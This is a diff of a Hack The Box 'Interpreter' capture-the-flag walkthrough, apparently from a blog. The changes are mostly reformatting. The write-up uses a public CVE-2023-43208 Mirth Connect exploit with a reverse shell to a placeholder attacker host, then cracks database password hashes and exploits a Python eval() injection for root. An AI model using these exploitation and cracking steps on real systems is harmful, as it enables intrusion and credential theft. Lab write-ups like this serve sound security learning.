@@ -1,16 +1,16 @@
 ---
-title: "HTB Interpreter: From Mirth Connect RCE to Root"
+title: "HTB Interpreter Walkthrough: CVE-2023-43208 & Root Privilege Escalation"
+title_post: "Hack The Box Interpreter Writeup | Mirth Connect RCE to Root"
 date: 2026-08-04 16:30:00 +0500
 
 categories:
   - HTB
-  - Linux
-  - Medium
+  - Writeups
 
 tags:
-  - HTB-Linux-Medium
+  - htb-linux-medium
   - htb
-  - cve 
+  - cve
   - rce
   - privilege-escalation
   - linux
@@ -18,59 +18,39 @@ tags:
   - python
   - eval-injection
 
+description: Detailed HTB Interpreter walkthrough. Learn how to exploit Mirth Connect (CVE-2023-43208) for RCE, extract database credentials, and escalate to root via Python eval injection.
+
 image:
   path: /assets/img/writeups/interpreter/banner.png
-  alt: HTB Interpreter Writeup
+  alt: Hack The Box Interpreter Machine Walkthrough/Writeup
 
 mermaid: true
 ---
 
-# Interpreter – Hack The Box Write-up
+## 1. Executive Summary & Machine Info
 
-## 1. Overview
+**Interpreter** is a medium-difficulty Linux machine on **Hack The Box** that showcases real-world web application exploitation, database credential harvesting, and insecure code execution. 
 
-Mirth is a medium-difficulty Linux machine that demonstrates how an exposed web application can lead to complete system compromise. The attack begins by identifying a vulnerable Mirth Connect instance, followed by exploitation of a known Remote Code Execution vulnerability. After gaining initial access, sensitive configuration files reveal database credentials, allowing recovery of valid SSH credentials. Finally, a vulnerable Python service running with root privileges is exploited to obtain full administrative access. 
-> 
-> **Difficulty:** Medium
-> 
-> **Platform:** Hack The Box
-> 
-> **Operating System:** Linux
-> 
-> **IP:** 10.129.x.x
-> 
-> **Categories:** Web Exploitation, Credential Access, Privilege Escalation
-> 
+The attack path begins with identifying an unauthenticated **Mirth Connect** service vulnerable to **CVE-2023-43208** to achieve Remote Code Execution (RCE). Post-exploitation enumeration reveals database configuration files containing encrypted hashes, which can be cracked using Hashcat to gain local user SSH access. Finally, privilege escalation to `root` is achieved by exploiting a custom Python script running as a privileged service via Python `eval()` injection.
 
----
-
-## 2. Skills Demonstrated
-
-| Skill | Description |
+| Attribute | Details |
 | --- | --- |
-| Reconnaissance | Service Discovery |
-| Enumeration | Version Fingerprinting |
-| Exploitation | CVE-2023-43208 |
-| Credential Access | Configuration Analysis |
-| Password Cracking | PBKDF2 |
-| Privilege Escalation | Python f-string Injection |
+| **OS** | Linux |
+| **Difficulty** | Medium |
+| **Platform** | [Hack The Box (HTB)](https://www.hackthebox.com/) |
+| **Primary Vectors** | Web Exploitation, Credential Reuse, Python Code Injection |
+| **CVE Reference** | CVE-2023-43208 (Mirth Connect RCE) |
 
 ---
 
-### Tools Used
+## 2. Key Takeaways & Applied Skills
 
-| Tool | Purpose |
+| Technical Skill | Application in Lab |
 | --- | --- |
-| Nmap | Service discovery and version detection |
-| Browser | Web application enumeration |
-| Git | Downloading exploit PoC |
-| Python | Exploit execution and payload creation |
-| MySQL Client | Database enumeration |
-| Hashcat | Password recovery |
-| SSH | User access |
-| Linux Utilities | Privilege escalation enumeration |
-
----
+| **Reconnaissance** | Port scanning and service version fingerprinting with Nmap |
+| **Web Exploitation** | Leveraging CVE-2023-43208 for initial access |
+| **Credential Harvesting** | Parsing database config files & cracking PBKDF2 hashes with Hashcat |
+| **Privilege Escalation** | Exploiting arbitrary string evaluation (`eval()`) in Python services |
 
 ## 3. Attack Path
 
@@ -130,11 +110,11 @@ flowchart TD
 
 ## 4. Reconnaissance
 
-### Objective
+### i. Objective
 
 The objective of this phase was to identify the exposed network services, determine the available attack surface, and gather information that could assist in further enumeration.
 
-### Network Discovery
+### ii. Network Discovery
 
 The target IP address was first assigned to a variable for easier command execution throughout the assessment.
 
@@ -148,16 +128,13 @@ A default Nmap scan was then performed using service version detection and defau
 nmap -sC -sV $ip
 ```
 
-### Evidence
-
-> **Nmap Scan Results**
-> 
+### iii. Evidence
 
 ![Nmap Scan Result](/assets/img/writeups/interpreter/nmap-scan-result.png)
-
+_Nmap Scan Results_
 ---
 
-### Analysis
+### iv. Analysis
 
 The scan identified three open TCP ports:
 
@@ -173,38 +150,32 @@ The presence of both HTTP and HTTPS services suggested that the primary attack s
 
 ## 5. Enumeration & Vulnerability Identification
 
-### Mirth Connect Identification
+### i. Mirth Connect Identification
 
 Accessing the target through a web browser revealed a web application running **Mirth Connect**, a healthcare integration platform that provides a web-based interface for managing integration channels.
 
-> **Mirth Connect Homepage**
-> 
 
 ![Mirth Connect Homepage](/assets/img/writeups/interpreter/mirth-connect-homepage.png)
+_Mirth Connect Homepage_
 
 The landing page contained a **Launch Mirth Connect Administrator** button. Selecting this option initiated the download of a Java Web Start (`webstart.jnlp`) file.
 
-> **Downloaded JNLP File**
-> 
-
 ![Downloaded JNLP File](/assets/img/writeups/interpreter/downloaded-jnlp-file.png)
+_Downloaded JNLP File_
 
-### Version Discovery
+### ii. Version Discovery
 
 The contents of the downloaded JNLP file revealed the exact version of the application.
 
-> **Mirth Connect Version Information**
-> 
-
 ![Mirth Connect Version Information](/assets/img/writeups/interpreter/mirth-connect-version-information.png)
-
+_Mirth Connect Version Information_
 The target was identified as running:
 
 | Software | Version |
 | --- | --- |
 | Mirth Connect | **4.4.0** |
 
-### CVE Research
+### iii. CVE Research
 
 With the software version identified, public vulnerability research was performed to determine whether any known security issues affected **Mirth Connect 4.4.0**.
 
@@ -219,11 +190,11 @@ Research identified **CVE-2023-43208**, a publicly disclosed **Remote Code Execu
 Additional research located a publicly available Proof-of-Concept (PoC) exploit that could be used to validate the vulnerability.
 
 [https://github.com/az4rvs/Mirth-Connect-CVE-2023-43208](https://github.com/az4rvs/Mirth-Connect-CVE-2023-43208)
-
+_CVE-2023-43208_
 ---
 ## 6. Initial Access
 
-### Exploiting CVE-2023-43208
+### i. Exploiting CVE-2023-43208
 
 The publicly available exploit repository was cloned to the attack machine.
 
@@ -231,7 +202,7 @@ The publicly available exploit repository was cloned to the attack machine.
 git clone https://github.com/az4rvs/Mirth-Connect-CVE-2023-43208.git
 ```
 
-### Exploitation
+### ii. Exploitation
 
 Based on the vulnerability research conducted during the enumeration phase, a publicly available Proof-of-Concept (PoC) exploit targeting **CVE-2023-43208** was selected.
 
@@ -243,7 +214,7 @@ python3 mirth_rce.py https://{target} <attacker_host> <attacker_port>
 
 The exploit was executed against the vulnerable Mirth Connect instance, resulting in successful remote code execution.
 
-### Reverse Shell
+### iii. Reverse Shell
 
 > **Successful Exploitation**
 
@@ -274,7 +245,7 @@ stty rows 40 cols 170
 
 ## 8. Local Enumeration
 
-### Configuration File Discovery
+### i. Configuration File Discovery
 
 System directories were reviewed to identify application configuration files.
 
@@ -298,7 +269,7 @@ The configuration file contained the application's database connection informati
 
 ## 9. Credential Access
 
-### MySQL Enumeration
+### i. MySQL Enumeration
 
 Using the recovered database credentials, the MySQL database was accessed.
 
@@ -317,7 +288,7 @@ Inspection of the users table revealed the following account.
 
 ![Database User Record 3](/assets/img/writeups/interpreter/database-user-record-3.png)
 
-### Password Hash Analysis
+### ii. Password Hash Analysis
 
 The extracted password was not stored in plaintext. Mirth Connect 4.4.0 uses **PBKDF2-HMAC-SHA256** for password hashing.
 
@@ -332,7 +303,7 @@ The stored hash consists of two main components:
 
 To perform offline password cracking, the original hash format was converted into a format supported by Hashcat.
 
-### Password Cracking
+### iii. Password Cracking
 
 The Base64 encoded hash was decoded, separated into its salt and derived key components, and reformatted according to Hashcat's PBKDF2-HMAC-SHA256 format.
 
@@ -370,7 +341,7 @@ The dictionary attack successfully recovered the plaintext password.
 
 ## 10. User Access
 
-### SSH Authentication
+### i. SSH Authentication
 
 Using the recovered credentials, SSH authentication was attempted.
 
@@ -391,7 +362,7 @@ The user flag was then successfully captured.
 
 ## 11. Privilege Escalation & Root Access
 
-### Root Service Discovery
+### i. Root Service Discovery
 
 After obtaining SSH access as the `sedric` user, local enumeration was performed to identify potential privilege escalation opportunities.
 
@@ -405,9 +376,8 @@ The service was bound to:
 
 ![Internal Services Enumeration](/assets/img/writeups/interpreter/internal-services-enumeration.png)
 
-### **Source Code Review**
+### ii. Source Code Review
 
-`notify.py`
 {% raw %}
 ```python
 #!/usr/bin/env python3
@@ -467,9 +437,10 @@ def receive():
 if __name__=="__main__":
     app.run("127.0.0.1",54321, threaded=True)
 ```
+{: file="notify.py"}
 {% endraw %}
 
-### Application Analysis
+### iii. Application Analysis
 
 The service was a simple Flask-based notification server responsible for processing patient information received from Mirth Connect.
 
@@ -490,7 +461,7 @@ if request.remote_addr != "127.0.0.1":
 
 Although the service was not externally accessible, local users could interact with it.
 
-### Vulnerability Identification
+### iv. Vulnerability Identification
 
 Reviewing the source code revealed an insecure implementation inside the `template()` function.
 
@@ -504,7 +475,7 @@ return eval(f"f'''{template}'''")
 {% endraw %}
 The use of `eval()` on user-controlled input introduced a critical **Python Expression Injection** vulnerability.
 
-### Root Cause Analysis
+### v. Root Cause Analysis
 
 The application attempted to sanitize input using a regular expression:
 
@@ -530,7 +501,7 @@ was interpreted and evaluated as:
 
 This confirmed arbitrary expression execution.
 
-### Exploitation for Root Shell
+### vi. Exploitation for Root Shell
 
 Since the `os` module was already imported by the application, operating system commands could be executed through the vulnerable expression.
 
@@ -579,10 +550,9 @@ ls -la /tmp/.sh
 whoami
 ```
 
-> **Exploit Payload Execution For Root**
-> 
 
 ![Exploit Payload Execution for Root](/assets/img/writeups/interpreter/exploit-payload-execution-for-root.png)
+_Exploit Payload Execution For Root_
 
 ### Impact
 
